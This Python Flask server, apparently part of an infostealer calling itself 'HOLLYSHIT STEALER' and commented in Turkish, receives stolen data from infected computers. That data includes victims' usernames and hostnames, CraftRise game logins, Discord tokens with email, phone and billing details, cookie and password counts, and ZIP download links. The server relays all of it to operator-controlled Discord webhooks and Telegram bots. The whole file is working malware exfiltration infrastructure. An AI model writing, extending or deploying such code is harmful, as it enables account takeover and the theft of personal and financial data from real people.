from flask import Flask, request, jsonify
import requests
import json
import os
import re
from datetime import datetime

app = Flask(__name__)

# Environment variables
WEBHOOK = os.environ.get("WEBHOOK", "")
TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
DISCORD_WEBHOOK = os.environ.get("DISCORD_WEBHOOK", "")
DISCORD_TELEGRAM_TOKEN = os.environ.get("DISCORD_TELEGRAM_TOKEN", "")
DISCORD_TELEGRAM_CHAT_ID = os.environ.get("DISCORD_TELEGRAM_CHAT_ID", "")
CRAFTRISE_WEBHOOK = os.environ.get("CRAFTRISE_WEBHOOK", "")
CRAFTRISE_TELEGRAM_TOKEN = os.environ.get("CRAFTRISE_TELEGRAM_TOKEN", "")
CRAFTRISE_TELEGRAM_CHAT_ID = os.environ.get("CRAFTRISE_TELEGRAM_CHAT_ID", "")
MASTER_WEBHOOK = os.environ.get("MASTER_WEBHOOK", "")
MASTER_TELEGRAM_TOKEN = os.environ.get("MASTER_TELEGRAM_TOKEN", "")
MASTER_TELEGRAM_CHAT_ID = os.environ.get("MASTER_TELEGRAM_CHAT_ID", "")

def send_discord(url, content, embeds=None):
    if not url:
        return
    try:
        payload = {"content": content}
        if embeds:
            payload["embeds"] = embeds
        requests.post(url, json=payload, timeout=30)
    except Exception as e:
        print(f"Discord hatası: {e}")

def send_telegram(token, chat_id, msg):
    if token and chat_id and msg:
        try:
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage", 
                         json={"chat_id": chat_id, "text": msg}, timeout=30)
        except:
            pass

@app.route('/webhook', methods=['POST'])
def webhook():
    try:
        data = request.get_json()
        log_type = data.get("type", "unknown")
        payload = data.get("data", data)
        
        print(f"[{datetime.now()}] Type: {log_type}")
        
        # ============ CRAFTRISE (Sadece CraftRise hesabı) ============
        if log_type == "craftrise":
            content = payload.get("content", str(payload))
            send_discord(CRAFTRISE_WEBHOOK, content)
            
            # Telegram için sadece hesap bilgisi
            match = re.search(r'`([^`]+)`', content)
            if match:
                tg_msg = f"🎮 CraftRise Hesabı!\n```\n{match.group(1)}\n```"
                send_telegram(CRAFTRISE_TELEGRAM_TOKEN, CRAFTRISE_TELEGRAM_CHAT_ID, tg_msg)
        
        # ============ DISCORD TOKEN (Sadece token) ============
        elif log_type == "discord":
            content = payload.get("content", str(payload))
            send_discord(DISCORD_WEBHOOK, content)
            send_telegram(DISCORD_TELEGRAM_TOKEN, DISCORD_TELEGRAM_CHAT_ID, content[:500])
        
        # ============ BROWSER / GLOBAL (HER ŞEY TEK MESAJDA) ============
        else:
            # Payload'dan verileri çek
            username = payload.get("username", "Unknown")
            hostname = payload.get("hostname", "Unknown")
            craftrise = payload.get("craftrise", "None")
            token_info = payload.get("first_token", {})
            download_url = payload.get("download_url", "")
            cookies = payload.get("cookies", 0)
            passwords = payload.get("passwords", 0)
            
            # Discord mesajını oluştur
            msg = f"@everyone `{username}` - `{hostname}`\n🎮 **CraftRise:** `{craftrise}`\n\n"
            
            if token_info:
                msg += f"**{token_info.get('user', 'Unknown')} ({token_info.get('id', 'ID')})**\n"
                msg += f"- 🔑 **Token:** `{token_info.get('token', 'None')[:50]}...`\n"
                msg += f"- 👤 **Username:** {token_info.get('user', 'Unknown')}\n"
                msg += f"- 🎖️ **Badges:** {token_info.get('badges', 'None')}\n"
                msg += f"- 💳 **Billings:** {token_info.get('billing', 'None')}\n"
                msg += f"- 📧 **Email:** {token_info.get('email', 'None')}\n"
                msg += f"- 📱 **Phone:** {token_info.get('phone', 'None')}\n\n"
            
            msg += f"📊 **Analysis Stats**\n- 🍪 **Cookies:** {cookies}\n- 🔑 **Passwords:** {passwords}\n"
            
            if download_url:
                msg += f"\n📥 **Download:** [Click Here to Download ZIP]({download_url})"
            
            # Discord'a gönder (Master webhook)
            send_discord(MASTER_WEBHOOK, msg)
            
            # Telegram'a da gönder (düz metin, markdown yok)
            tg_msg = f"🕸️ HOLLYSHIT STEALER\n\n👤 Kullanıcı: {username}\n💻 Bilgisayar: {hostname}\n🎮 CraftRise: {craftrise}\n\n"
            if token_info:
                tg_msg += f"📌 Discord Token:\n👤 {token_info.get('user', 'Unknown')}\n📧 {token_info.get('email', 'None')}\n🔑 {token_info.get('token', 'None')[:40]}...\n\n"
            tg_msg += f"📊 İstatistikler:\n🍪 Çerez: {cookies}\n🔑 Şifre: {passwords}\n"
            if download_url:
                tg_msg += f"\n📥 ZIP İndir: {download_url}"
            
            send_telegram(MASTER_TELEGRAM_TOKEN, MASTER_TELEGRAM_CHAT_ID, tg_msg)
        
        return jsonify({"status": "ok"}), 200
        
    except Exception as e:
        print(f"Hata: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/')
def home():
    return "HollyShit Proxy Running"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
